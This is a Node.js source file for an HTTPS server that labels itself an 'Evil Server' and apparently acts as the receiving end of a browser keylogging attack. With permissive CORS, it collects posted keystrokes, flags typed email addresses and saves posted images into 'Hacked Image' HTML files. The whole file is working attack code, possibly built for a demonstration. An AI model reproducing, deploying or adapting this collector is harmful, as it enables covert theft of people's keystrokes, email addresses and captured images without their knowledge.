const https = require("https");
const fs = require("fs");
const options = {
  key: fs.readFileSync("example.com+5-key.pem"),
  cert: fs.readFileSync("example.com+5.pem"),
};
console.log("**** Evil Server ****");
console.log("*** MuHAHAHAHAHAHAHAHAA ***");

const getBodyJson = (body) => {
  try {
    return JSON.parse(body);
  } catch (err) {
    return {};
  }
};

let word = "";
https
  .createServer(options, function (request, response) {
    response.setHeader("Access-Control-Allow-Origin", "*");
    response.setHeader("Access-Control-Allow-Methods", "OPTIONS, GET, POST");
    response.setHeader("Access-Control-Max-Age", 2592000); // 30 days
    let body = [];
    request
      .on("data", (chunk) => {
        body.push(chunk);
      })
      .on("end", () => {
        const strBody = Buffer.concat(body).toString();

        // console.log(`==== ${request.method} ${request.url}`);
        console.log(strBody);

        const jsonBody = getBodyJson(strBody);
        if (jsonBody.type === "key") {
          const letter = jsonBody.key;
          word += letter;
          if (letter === " ") {
            if (word.indexOf("@") > -1) {
              console.warn("🎺 email found: " + word + " 🎺");
            }
            word = "";
          }
        }

        if (jsonBody.type === "image") {
          const imageName = `${Date.now()}.html`;
          const htmlWithImage = `<html><body><h1>Hacked Image - ${new Date().toDateString()}</h1><img src="${
            jsonBody.content
          }" /></body></html>`;
          fs.writeFile(imageName, htmlWithImage, function (err) {
            if (err) throw err;
            console.log("=== Image saved: ", imageName);
          });
        }
        response.end();
      });
  })
  .listen(1111);
